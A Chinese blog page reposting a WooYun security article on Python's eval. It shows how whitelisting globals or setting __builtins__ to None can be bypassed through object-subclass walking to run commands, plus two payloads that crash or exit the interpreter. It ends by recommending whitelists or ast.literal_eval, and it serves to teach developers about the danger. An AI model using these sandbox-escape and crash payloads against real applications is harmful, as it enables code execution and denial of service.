@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <meta charset="utf-8">
+    
+    <title>【转】Python中eval的强大与潜在风险 | Vimiix</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。
+原文出处：WooYun - 隐形人真忙">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【转】Python中eval的强大与潜在风险">
+<meta property="og:url" content="http://www.vimiix.com/2017/05/04/Python-How-to-use-eval.html">
+<meta property="og:site_name" content="Vimiix">
+<meta property="og:description" content="这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。
+原文出处：WooYun - 隐形人真忙">
+<meta property="og:image" content="http://omfis13un.bkt.clouddn.com/python-eval.jpg">
+<meta property="og:updated_time" content="2017-05-05T02:43:09.854Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【转】Python中eval的强大与潜在风险">
+<meta name="twitter:description" content="这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。
+原文出处：WooYun - 隐形人真忙">
+<meta name="twitter:image" content="http://omfis13un.bkt.clouddn.com/python-eval.jpg">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/favicon.png" />
+    
+
+    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/vendor/open-sans/styles.css">
+    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/vendor/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/vendor/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+    
+        <script>
+var _hmt = _hmt || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?6dd417889b493646e8af6f793152b918";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                
+                <span class="site-title">Vimiix</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">文章</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">作者</a>
+                
+                    <a class="main-nav-link" href="https://github.com/vimiix">Github</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">文章</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">作者</a></td>
+                
+                    <td><a class="main-nav-link" href="https://github.com/vimiix">Github</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">Vimiix</h2>
+            <h3 id="title">程序员&amp;产品运营</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>CSDN, Beijing, China</span>
+            <a id="follow" target="_blank" href="https://github.com/vimiix">关注</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                18
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                27
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/vimiix" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://twitter.com/_vimiix" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="http://weibo.com/boynigel" target="_blank" title="weibo" class=tooltip>
+                            <i class="fa fa-weibo"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="http://wpa.qq.com/msgrd?v=3&uin=544472800&site=qq&menu=yes" target="_blank" title="qq" class=tooltip>
+                            <i class="fa fa-qq"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-Python-How-to-use-eval" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            【转】Python中eval的强大与潜在风险
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2017/05/04/Python-How-to-use-eval.html">
+            <time datetime="2017-05-04T15:57:34.000Z" itemprop="datePublished">2017-05-04</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Python/">Python</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Python/">Python</a>, <a class="tag-link" href="/tags/eval/">eval</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p><img src="http://omfis13un.bkt.clouddn.com/python-eval.jpg" alt=""></p>
+<p>这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。</p>
+<p>原文出处：<a href="http://drops.wooyun.org/tips/7710" target="_blank" rel="external">WooYun - 隐形人真忙</a></p>
+<a id="more"></a>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><hr>
+
+<p>eval是Python用于执行python表达式的一个内置函数，使用eval，可以很方便的将字符串动态执行。比如下列代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"1+2"</span>)</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"[x for x in range(10)]"</span>)</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div></pre></td></tr></table></figure>
+<p>当内存中的内置模块含有os的话，eval同样可以做到命令执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"os.system('whoami')"</span>)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<p>当然，eval只能执行Python的表达式类型的代码，不能直接用它进行import操作，但exec可以。如果非要使用eval进行import，则使用<strong>import</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>exec(<span class="string">'import os'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'import os'</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span>, <span class="keyword">in</span> </div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span></div><div class="line">    <span class="keyword">import</span> os</div><div class="line">         ^</div><div class="line">SyntaxError: invalid syntax</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"__import__('os').system('whoami')"</span>)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<p>在实际的代码中，往往有使用客户端数据带入eval中执行的需求。比如动态模块的引入，举个栗子，一个在线爬虫平台上爬虫可能有多个并且位于不同的模块中，服务器端但往往只需要调用用户在客户端选择的爬虫类型，并通过后端的exec或者eval进行动态调用，后端编码实现非常方便。但如果对用户的请求处理不恰当，就会造成严重的安全漏洞。</p>
+<h1 id="0x01-“安全”使用eval"><a href="#0x01-“安全”使用eval" class="headerlink" title="0x01 “安全”使用eval"></a>0x01 “安全”使用eval</h1><hr>
+
+<p>现在提倡最多的就是使用eval的后两个参数来设置函数的白名单：</p>
+<p>Eval函数的声明为eval(expression[, globals[, locals]])</p>
+<p>其中，第二三个参数分别指定能够在eval中使用的函数等，如果不指定，默认为globals()和locals()函数中 包含的模块和函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'os'</span> <span class="keyword">in</span> globals()</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'os.system('</span>whoami<span class="string">')'</span>)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'os.system('</span>whoami<span class="string">')'</span>,&#123;&#125;,&#123;&#125;)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span>, <span class="keyword">in</span> </div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span>, <span class="keyword">in</span> </div><div class="line">NameError: name <span class="string">'os'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div></pre></td></tr></table></figure>
+<p>如果指定只允许调用abs函数，可以使用下面的写法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'abs(-20)'</span>,&#123;<span class="string">'abs'</span>:abs&#125;,&#123;<span class="string">'abs'</span>:abs&#125;)</div><div class="line"><span class="number">20</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'os.system('</span>whoami<span class="string">')'</span>,&#123;<span class="string">'abs'</span>:abs&#125;,&#123;<span class="string">'abs'</span>:abs&#125;)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span>, <span class="keyword">in</span> </div><div class="line">  File <span class="string">""</span>, line <span class="number">1</span>, <span class="keyword">in</span> </div><div class="line">NameError: name <span class="string">'os'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'os.system('</span>whoami<span class="string">')'</span>)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<p>使用这种方法来防护，确实可以起到一定的作用，但是，这种处理方法可能会被绕过，从而造成其他问题！</p>
+<h1 id="0x02-绕过执行代码1"><a href="#0x02-绕过执行代码1" class="headerlink" title="0x02 绕过执行代码1"></a>0x02 绕过执行代码1</h1><hr>
+
+<p>被绕过的情景如下，小明知道了eval会带来一定的安全风险，所以使用如下的手段去防止eval执行任意代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line">env = &#123;&#125;</div><div class="line">env[<span class="string">"locals"</span>]   = <span class="keyword">None</span></div><div class="line">env[<span class="string">"globals"</span>]  = <span class="keyword">None</span></div><div class="line">env[<span class="string">"__name__"</span>] = <span class="keyword">None</span></div><div class="line">env[<span class="string">"__file__"</span>] = <span class="keyword">None</span></div><div class="line">env[<span class="string">"__builtins__"</span>] = <span class="keyword">None</span></div><div class="line"> </div><div class="line">eval(users_str, env)</div></pre></td></tr></table></figure>
+<p>Python中的<strong>builtins</strong>是内置模块，用来设置内置函数的模块。比如熟悉的abs，open等内置函数，都是在该模块中以字典的方式存储的，下面两种写法是等价的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.abs(<span class="number">-20</span>)</div><div class="line"><span class="number">20</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-20</span>)</div><div class="line"><span class="number">20</span></div></pre></td></tr></table></figure>
+<p>我们也可以自定义内置函数，并像使用Python中的内置函数一样使用它们：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">'shabi'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.__dict__[<span class="string">'say_hello'</span>] = hello</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>say_hello()</div><div class="line">shabi</div></pre></td></tr></table></figure>
+<p>小明将eval函数的作用域中的内置模块设置为None，好像看起来很彻底了，但依然可以被绕过。<strong>builtins</strong>是<strong>builtin</strong>的一个引用，在<strong>main</strong>模块下，两者是等价的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>id(__builtins__)</div><div class="line"><span class="number">3549136</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>id(__builtin__)</div><div class="line"><span class="number">3549136</span></div></pre></td></tr></table></figure>
+<p>根据<a href="http://drops.wooyun.org/web/7490" target="_blank" rel="external">乌云drops</a>提到的方法，使用如下代码即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">"zipimporter"</span>][<span class="number">0</span>](<span class="string">"/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg"</span>).load_module(<span class="string">"configobj"</span>).os.system(<span class="string">"uname"</span>)</div></pre></td></tr></table></figure>
+<p>上面的代码首先利用<strong>class</strong>和<strong>subclasses</strong>动态加载了object对象，这是因为eval中无法直接使用object。然后使用object的子类的zipimporter对egg压缩文件中的configobj模块进行导入，并调用其内置模块中的os模块从而实现命令执行，当然，前提是要有configobj的egg文件。 configobj模块很有意思，居然内置了os模块：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"os"</span> <span class="keyword">in</span> configobj.__dict__</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> urllib</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"os"</span> <span class="keyword">in</span> urllib.__dict__</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> urllib2</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"os"</span> <span class="keyword">in</span> urllib2.__dict__</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>configobj.os.system(<span class="string">"whoami"</span>)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<p>和configobj类似的模块如urllib，urllib2，setuptools等都有os的内置，理论上使用哪个都行。 如果无法下载egg压缩文件，可以下载带有setup.py的文件夹，加入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</div></pre></td></tr></table></figure>
+<p>就可以在dist文件夹中找到对应的egg文件。 绕过demo如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env = &#123;&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env[<span class="string">"locals"</span>]   = <span class="keyword">None</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env[<span class="string">"globals"</span>]  = <span class="keyword">None</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env[<span class="string">"__name__"</span>] = <span class="keyword">None</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env[<span class="string">"__file__"</span>] = <span class="keyword">None</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>env[<span class="string">"__builtins__"</span>] = <span class="keyword">None</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>users_str = <span class="string">"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'zipimporter'][0]('E:/internships/configobj-5.0.5-py2.7.egg').load_module('configobj').os.system('whoami')"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(users_str, env)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(users_str, &#123;&#125;, &#123;&#125;)</div><div class="line">win<span class="number">-20140812</span>chjadministrator</div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<h1 id="0x03-拒绝服务攻击1"><a href="#0x03-拒绝服务攻击1" class="headerlink" title="0x03 拒绝服务攻击1"></a>0x03 拒绝服务攻击1</h1><hr>
+
+<p>object的子类中有很多有趣的东西，执行以下代码查看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line">[x.__name__ <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()]</div></pre></td></tr></table></figure>
+<p>这里我就不输出结果了，如果你执行的话，可以看到很多有趣的模块，比如file，zipimporter，Quitter等。经过测试，file的构造函数是被解释器沙箱隔离的。 简单的，或者直接使object暴露出的子类Quitter进行退出：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!python</div><div class="line">&gt;&gt;&gt; eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__</div><div class="line"> == 'Quitter'][0](0)()", &#123;'__builtins__':None&#125;)</div><div class="line"> </div><div class="line">C:/&gt;</div></pre></td></tr></table></figure>
+<p>如果运气好，遇到对方程序中导入了os等敏感模块，那么Popen就可以用，并且绕过<strong>builins</strong>为空的限制，栗子如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> subprocess</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-n','1','127.0.0.1'])"</span>,&#123;<span class="string">'__builtins__'</span>:<span class="keyword">None</span>&#125;)</div><div class="line"> </div><div class="line">&gt;&gt;&gt;</div><div class="line">正在 Ping <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> 具有 <span class="number">32</span> 字节的数据:</div><div class="line">来自 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> 的回复: 字节=<span class="number">32</span> 时间&gt;&gt;</div></pre></td></tr></table></figure>
+<p>事实上，这种情况非常多，比如导入os模块，一般用来处理路径问题。所以说，遇到这种情况，完全可以列举大量的功能函数，来探测目标object的子类中是否含有一些危险的函数可以直接使用。</p>
+<h1 id="0x04-拒绝服务攻击2"><a href="#0x04-拒绝服务攻击2" class="headerlink" title="0x04 拒绝服务攻击2"></a>0x04 拒绝服务攻击2</h1><hr>
+
+<p>同样，我们甚至可以绕过<strong>builtins</strong>为None，造成一次拒绝服务攻击，Payload(来自老外blog)如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'(lambda fc=(lambda n: [c 1="c" 2="in" 3="().__class__.__bases__[0" language="for"][/c].__subclasses__() if c.__name__ == n][0]):fc("function")(fc("code")(0,0,0,0,"KABOOM",(),(),(),"","",0,""),&#123;&#125;)())()'</span>, &#123;<span class="string">"__builtins__"</span>:<span class="keyword">None</span>&#125;)</div></pre></td></tr></table></figure>
+<p>运行上面的代码，Python直接crash掉了，造成拒绝服务攻击。 原理是通过嵌套的lambda来构造一片代码段，即code对象。为这个code对象分配空的栈，并给出相应的代码字符串，这里是KABOOM，在空栈上执行代码，会出现crash。构造完成后，调用fc函数即可触发，其思路不可谓不淫荡。</p>
+<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><hr>
+
+<p>从上面的内容我们可以看出，单单将内置模块置为空，是不够的，最好的机制是构造白名单，如果觉得比较麻烦，可以使用ast.literal_eval代替不安全的eval。</p>
+<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
+<li>【1】<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html" target="_blank" rel="external">http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html</a></li>
+<li>【2】<a href="http://drops.wooyun.org/web/7490" target="_blank" rel="external">http://drops.wooyun.org/web/7490</a></li>
+<li>【3】<a href="http://stackoverflow.com/questions/3513292/python-make-eval-safe" target="_blank" rel="external">http://stackoverflow.com/questions/3513292/python-make-eval-safe</a></li>
+</ul>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+    <div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <!--a class="jiathis_button_qzone">QQ空间</a-->
+    <a class="jiathis_button_tsina">新浪微博</a>
+    <!--a class="jiathis_button_tqq">腾讯微博</a-->
+    <a class="jiathis_button_weixin">微信</a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<style>
+    .jiathis_style div:first-child:not(.jiadiv_01) {
+        width: auto !important;
+        border: none !important;
+    }
+    .jiathis_style .jiadiv_01 {
+        margin: 10px 0;
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .jiathis_style .jiadiv_01 div:first-child {
+        display: none;
+    }
+    .jiathis_style .jiadiv_02 {
+        padding: 7px 0 !important;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle {
+        width: 85px;
+        border: none;
+        height: auto;
+        margin: 3px 10px;
+        padding: 6px 10px;
+        border-radius: 4px;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle:hover {
+        border: none;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle:nth-child(even) {
+        margin-left: 0;
+    }
+    .jiathis_style .jtico:hover {
+        opacity: 1;
+    }
+    .jiathis_style .ckepopBottom,
+    .jiathis_style .centerBottom {
+        width: auto !important;
+        padding: 5px;
+        background: #f7f7f7;
+    }
+</style>
+
+
+
+</div>
+
+            
+    
+        <a href="http://www.vimiix.com/2017/05/04/Python-How-to-use-eval.html#comments" class="article-comment-link">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2017/05/11/Product-pyCSDNDailySpider.html" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">上一篇</strong>
+            <div class="article-nav-title">
+                
+                    Product-一个小爬虫pyCSDNDailySpider
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2017/04/26/Better-than-yesterday.html" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">【随笔】做一个比昨天的自己更优秀的人</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+	<div id="commentContainer"></div>
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title" style="color:#CD0000">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2017/06/01/Python-Python-multiversion-dev-Anaconda.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://omfis13un.bkt.clouddn.com/conda.png)" alt="Python||使用Anaconda完成Python多环境配置" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Python/">Python</a></p>
+                            <p class="item-title"><a href="/2017/06/01/Python-Python-multiversion-dev-Anaconda.html" class="title">Python||使用Anaconda完成Python多环境配置</a></p>
+                            <p class="item-date"><time datetime="2017-06-01T01:53:54.000Z" itemprop="datePublished">2017-06-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2017/05/25/Python-pyCon2017-keynotes.html" class="thumbnail">
+    
+    
